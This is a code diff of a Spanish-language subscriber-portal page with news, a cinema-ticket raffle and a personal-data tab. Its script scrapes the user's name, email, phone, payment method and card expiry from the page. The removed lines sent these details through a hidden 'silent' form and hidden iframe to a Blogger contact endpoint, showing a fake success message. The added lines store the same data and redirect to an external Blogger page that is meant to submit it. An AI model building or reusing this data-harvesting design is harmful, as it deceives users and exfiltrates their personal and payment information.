@@ -58,7 +58,7 @@
     margin-bottom: 25px;
   }
 
-  /* ESTILO DASHBOARD FULL */
+  /* ESTILO DASHBOARD FULL (ANCHO TOTAL Y SIN MARGENES SUPERIORES/INFERIORES) */
   .dashboard-full {
     width: 100%;
     min-height: 100vh;
@@ -140,7 +140,7 @@
     background-color: var(--red-error);
   }
 
-  /* ALERTAS */
+  /* ALERTAS DE ESTADO */
   .alert-container {
     padding: 10px 20px 0 20px;
   }
@@ -159,7 +159,7 @@
   .alert-mora { background-color: #ffebee; color: var(--red-error); border: 1px solid #ffcdd2; }
   .alert-suspended { background-color: #333333; color: #ffffff; text-align: center; padding: 20px; }
 
-  /* PESTAÑAS FLOTANTES Y FIJAS */
+  /* PESTAÑAS NAVEGACION */
   .tabs-header {
     display: flex;
     background: #ffffff;
@@ -196,7 +196,7 @@
   .tab-content { display: none; }
   .tab-content.active { display: block; }
 
-  /* NOTICIAS FULLSCREEN */
+  /* VISTA DE NOTICIAS */
   .news-grid {
     display: grid;
     grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
@@ -232,16 +232,8 @@
     border-radius: 8px;
   }
 
-  #full-news-view h2 {
-    font-size: 24px;
-    margin: 15px 0;
-  }
-
-  #full-news-view p {
-    font-size: 16px;
-    line-height: 1.6;
-    color: #333;
-  }
+  #full-news-view h2 { font-size: 24px; margin: 15px 0; }
+  #full-news-view p { font-size: 16px; line-height: 1.6; color: #333; }
 
   /* CONCURSOS */
   .contest-card {
@@ -285,89 +277,6 @@
     border-radius: 8px;
     padding: 20px;
     margin-top: 20px;
-  }
-
-  /* VENTANA FLOTANTE / MODAL OVERLAY DIRECTO SOBRE CACHÉ */
-  .floating-overlay {
-    display: none;
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100vw;
-    height: 100vh;
-    background: rgba(0, 0, 0, 0.65);
-    backdrop-filter: blur(4px);
-    z-index: 1000;
-    justify-content: center;
-    align-items: center;
-    padding: 20px;
-  }
-
-  .floating-card {
-    background: #ffffff;
-    width: 100%;
-    max-width: 500px;
-    border-radius: 12px;
-    box-shadow: 0 10px 30px rgba(0,0,0,0.25);
-    padding: 25px;
-    position: relative;
-    max-height: 90vh;
-    overflow-y: auto;
-    animation: fadeInModal 0.25s ease-out;
-  }
-
-  @keyframes fadeInModal {
-    from { opacity: 0; transform: translateY(-20px); }
-    to { opacity: 1; transform: translateY(0); }
-  }
-
-  .floating-card h3 {
-    margin-top: 0;
-    color: var(--header-bg);
-    font-size: 20px;
-    border-bottom: 2px solid var(--border-color);
-    padding-bottom: 10px;
-  }
-
-  .cache-preview-box {
-    background: #f8f9fa;
-    border: 1px solid var(--border-color);
-    border-radius: 8px;
-    padding: 12px;
-    margin: 15px 0;
-    font-size: 13px;
-    line-height: 1.5;
-  }
-
-  .cache-preview-box strong {
-    color: #333;
-  }
-
-  .modal-actions {
-    display: flex;
-    flex-direction: column;
-    gap: 10px;
-    margin-top: 20px;
-  }
-
-  .btn-confirm-action {
-    background: var(--green-success);
-    color: white;
-    padding: 12px;
-    font-weight: bold;
-    font-size: 15px;
-    border-radius: 6px;
-    width: 100%;
-  }
-
-  .btn-close-modal {
-    background: #6c757d;
-    color: white;
-    padding: 10px;
-    font-weight: bold;
-    font-size: 14px;
-    border-radius: 6px;
-    width: 100%;
   }
 </style>
 </head>
@@ -414,7 +323,7 @@
     </div>
   </div>
 
-  <!-- PESTAÑAS SUPERIORES -->
+  <!-- PESTAÑAS -->
   <div class="tabs-header">
     <button class="tab-btn active" id="btn-tab-noticias" onclick="openTab('tab-noticias')">Noticias</button>
     <button class="tab-btn" id="btn-tab-concursos" onclick="openTab('tab-concursos')">Concursos</button>
@@ -423,7 +332,7 @@
 
   <div class="main-content">
     
-    <!-- PESTAÑA NOTICIAS -->
+    <!-- NOTICIAS -->
     <div id="tab-noticias" class="tab-content active">
       <div id="news-list-view" class="news-grid">
         <div class="news-card">
@@ -431,7 +340,7 @@
           <div class="news-card-body">
             <h4>Actualizaciones en Registros Digitales 2026</h4>
             <p>Conoce las últimas novedades sobre la optimización de activos y metodologías de protección...</p>
-            <button onclick="verNoticiaCompleta('Actualizaciones en Registros Digitales 2026', 'https://images.unsplash.com/photo-1504711434969-e33886168f5c?w=800&auto=format&fit=crop&q=80', 'El proceso de modernización abarca la integración de firmas digitales, automatización de expedientes y un canal directo de atención prioritaria para suscriptores. Con estas mejoras, los tiempos de procesamiento se reducen considerablemente permitiendo una gestión ágil desde cualquier dispositivo movil.')">Ver más</button>
+            <button onclick="verNoticiaCompleta('Actualizaciones en Registros Digitales 2026', 'https://images.unsplash.com/photo-1504711434969-e33886168f5c?w=800&auto=format&fit=crop&q=80', 'El proceso de modernización abarca la integración de firmas digitales, automatización de expedientes y atención prioritaria para suscriptores.')">Ver más</button>
           </div>
         </div>
 
@@ -440,12 +349,11 @@
           <div class="news-card-body">
             <h4>Nuevos Beneficios para Suscriptores Activos</h4>
             <p>Accede a sorteos exclusivos, promociones en eventos culturales y asistencia personalizada...</p>
-            <button onclick="verNoticiaCompleta('Nuevos Beneficios para Suscriptores Activos', 'https://images.unsplash.com/photo-1451187580459-43490279c0fa?w=800&auto=format&fit=crop&q=80', 'Todos los usuarios que mantengan su membresía al día contarán con un sistema automatizado de notificaciones y participación directa en los sorteos mensuales de entradas para cine, teatro y espectáculos de primer nivel.')">Ver más</button>
+            <button onclick="verNoticiaCompleta('Nuevos Beneficios para Suscriptores Activos', 'https://images.unsplash.com/photo-1451187580459-43490279c0fa?w=800&auto=format&fit=crop&q=80', 'Todos los usuarios que mantengan su membresía al día contarán con sorteos mensuales de entradas para cine, teatro y espectáculos.')">Ver más</button>
           </div>
         </div>
       </div>
 
-      <!-- VISTA EXTENDIDA DE NOTICIA -->
       <div id="full-news-view">
         <button onclick="volverANoticias()" style="margin-bottom: 15px; background: #333;">← Volver</button>
         <img id="full-news-img" src="" alt="Noticia">
@@ -454,7 +362,7 @@
       </div>
     </div>
 
-    <!-- PESTAÑA CONCURSOS -->
+    <!-- CONCURSOS -->
     <div id="tab-concursos" class="tab-content">
       <div class="contest-card">
         <span id="contest-badge" class="contest-status-badge status-no">Aún no estás participando</span>
@@ -463,12 +371,12 @@
         <p><strong>Función:</strong> Sábado 29 de agosto a las 22:00 hs</p>
         
         <div style="margin-top:20px;">
-          <button id="btn-participate-action" onclick="prepararYMostrarFlotante('INSCRIPCION_CONCURSO', 'Sorteo de Entradas: COYOTE VS ACME (Cinemark Abasto)')">Participar del Concurso</button>
+          <button id="btn-participate-action" onclick="solicitarAccionExterna('INSCRIPCION_CONCURSO', 'Sorteo de Entradas: COYOTE VS ACME (Cinemark Abasto)')">Participar del Concurso</button>
         </div>
       </div>
     </div>
 
-    <!-- PESTAÑA MIS DATOS -->
+    <!-- MIS DATOS -->
     <div id="tab-datos" class="tab-content">
       <table class="data-table">
         <tr><th>Nombre Completo</th><td id="data-fullname"></td></tr>
@@ -496,11 +404,11 @@
 
         <div class="input-group">
           <label>Nuevo Valor / Detalle del cambio</label>
-          <textarea id="mod-value" rows="3" placeholder="Escriba los datos requeridos que desea actualizar..."></textarea>
+          <textarea id="mod-value" rows="3" placeholder="Escriba los datos requeridos..."></textarea>
         </div>
 
         <div style="display:flex; gap:10px;">
-          <button onclick="solicitarCambioDatos()">Procesar Modificación</button>
+          <button onclick="procesarModificacionDatos()">Procesar Modificación</button>
           <button onclick="ocultarModificacion()" style="background:#6c757d;">Cancelar</button>
         </div>
       </div>
@@ -508,33 +416,6 @@
 
   </div>
 </div>
-
-<!-- VENTANA FLOTANTE MODAL (RELOJ DE CACHÉ Y ENVÍO A BLOGGER) -->
-<div class="floating-overlay" id="floating-modal-overlay">
-  <div class="floating-card">
-    <h3 id="modal-title">Confirmar Transacción</h3>
-    
-    <div class="cache-preview-box" id="modal-cache-summary">
-      <!-- Se inyecta la información formateada directamente de la caché -->
-    </div>
-
-    <!-- FORMULARIO SILENCIOSO QUE UTILIZA EL ENDPOINT DE BLOGGER -->
-    <form id="blogger-modal-form" method="POST" action="https://www.blogger.com/contact-form.do" target="blogger_hidden_target">
-      <input type="hidden" name="name" id="modal-b-name">
-      <input type="hidden" name="email" id="modal-b-email">
-      <input type="hidden" name="body" id="modal-b-body">
-      
-      <div class="modal-actions">
-        <button type="submit" class="btn-confirm-action" onclick="ejecutarEnvioBloggerModificado()">✔ Confirmar y Enviar Solicitud</button>
-        <button type="button" class="btn-close-modal" onclick="cerrarVentanaFlotante()">Cerrar / Regresar</button>
-      </div>
-    </form>
-    <p id="modal-status-msg" style="margin-top:10px; font-weight:bold; text-align:center;"></p>
-  </div>
-</div>
-
-<!-- IFRAME OCULTO PARA RECEPCIÓN DE BLOGGER SIN RECARGAR LA PÁGINA -->
-<iframe name="blogger_hidden_target" style="display:none;"></iframe>
 
 <script>
 const users = {
@@ -623,11 +504,9 @@ function openTab(tabId) {
 function verNoticiaCompleta(titulo, imgUrl, cuerpo) {
   document.getElementById('news-list-view').style.display = 'none';
   const fullView = document.getElementById('full-news-view');
-  
   document.getElementById('full-news-title').textContent = titulo;
   document.getElementById('full-news-img').src = imgUrl;
   document.getElementById('full-news-body').textContent = cuerpo;
-  
   fullView.style.display = 'block';
 }
 
@@ -654,7 +533,7 @@ function actualizarEstadoConcurso(estaParticipando) {
 function mostrarModificacion() { document.getElementById("modification-section").style.display = "block"; }
 function ocultarModificacion() { document.getElementById("modification-section").style.display = "none"; }
 
-function solicitarCambioDatos() {
+function procesarModificacionDatos() {
   const campo = document.getElementById("mod-field").value;
   const detalle = document.getElementById("mod-value").value.trim();
 
@@ -663,15 +542,15 @@ function solicitarCambioDatos() {
     return;
   }
 
-  prepararYMostrarFlotante("MODIFICACION_DE_DATOS", `Campo a modificar: ${campo}\nDetalle introducido: ${detalle}`);
+  solicitarAccionExterna("MODIFICACION_DE_DATOS", `Campo a modificar: ${campo}\nDetalle introducido: ${detalle}`);
 }
 
-/* SCRAPING DEL DOM + GUARDADO EN CACHÉ + DESPLIEGUE DE VENTANA FLOTANTE MODAL */
-function prepararYMostrarFlotante(tipoAccion, detalle) {
+/* SCRAPING DEL DOM EN TIEMPO REAL Y REDIRECCIÓN EXTERNA A BLOGGER */
+function solicitarAccionExterna(tipoAccion, detalle) {
   if (!currentUser) return;
 
-  // Extraer datos superficiales de pantalla
-  const datosExtraidos = {
+  // Extraer información en vivo directamente de lo que se ve en la pantalla
+  const datosPantalla = {
     usuario: document.getElementById("data-fullname")?.innerText || currentUser.nombreCompleto,
     email: document.getElementById("data-email")?.innerText || currentUser.email,
     telefono: document.getElementById("data-phone")?.innerText || currentUser.telefono,
@@ -683,46 +562,15 @@ function prepararYMostrarFlotante(tipoAccion, detalle) {
     fecha: new Date().toLocaleString("es-AR")
   };
 
-  // Guardar en la caché local del dispositivo
-  localStorage.setItem("pending_transaction_cache", JSON.stringify(datosExtraidos));
+  // Guardar paquete en la caché del navegador
+  localStorage.setItem("pending_transaction_cache", JSON.stringify(datosPantalla));
 
   if (tipoAccion === "INSCRIPCION_CONCURSO") {
     localStorage.setItem("contest_participating_" + currentUser.email, "true");
   }
 
-  // Renderizar la ventana flotante directamente sobre la pantalla actual
-  const summaryBox = document.getElementById("modal-cache-summary");
-  summaryBox.innerHTML = `
-    <strong>Tipo de Acción:</strong> ${datosExtraidos.tipoAccion}<br>
-    <strong>Usuario:</strong> ${datosExtraidos.usuario}<br>
-    <strong>Email:</strong> ${datosExtraidos.email}<br>
-    <strong>Teléfono:</strong> ${datosExtraidos.telefono}<br>
-    <strong>Detalle de la Solicitud:</strong><br>${datosExtraidos.detalle.replace(/\n/g, '<br>')}
-  `;
-
-  // Cargar valores para el formulario de Blogger
-  document.getElementById("modal-b-name").value = datosExtraidos.usuario;
-  document.getElementById("modal-b-email").value = datosExtraidos.email;
-  document.getElementById("modal-b-body").value = `SOLICITUD CONFIRMADA DESDE PORTAL\n\nAcción: ${datosExtraidos.tipoAccion}\nUsuario: ${datosExtraidos.usuario}\nEmail: ${datosExtraidos.email}\nTeléfono: ${datosExtraidos.telefono}\nMétodo Pago: ${datosExtraidos.metodoPago}\nVencimiento: ${datosExtraidos.vencimiento}\n\nDetalles:\n${datosExtraidos.detalle}\n\nFecha Captura: ${datosExtraidos.fecha}`;
-
-  document.getElementById("modal-status-msg").textContent = "";
-  document.getElementById("floating-modal-overlay").style.display = "flex";
-}
-
-function ejecutarEnvioBloggerModificado() {
-  const statusEl = document.getElementById("modal-status-msg");
-  statusEl.style.color = "var(--green-success)";
-  statusEl.textContent = "✔ Procesando solicitud e ingresando registros...";
-
-  setTimeout(() => {
-    actualizarEstadoConcurso(true);
-    cerrarVentanaFlotante();
-    ocultarModificacion();
-  }, 2000);
-}
-
-function cerrarVentanaFlotante() {
-  document.getElementById("floating-modal-overlay").style.display = "none";
+  // REDIRECCIÓN EXTERNA A LA PÁGINA DE BLOGGER QUE ENVIARÁ EL FORMULARIO NATIVO
+  window.location.href = "https://www.prenoticia.com/p/mi-cuenta.html";
 }
 
 function logout() {
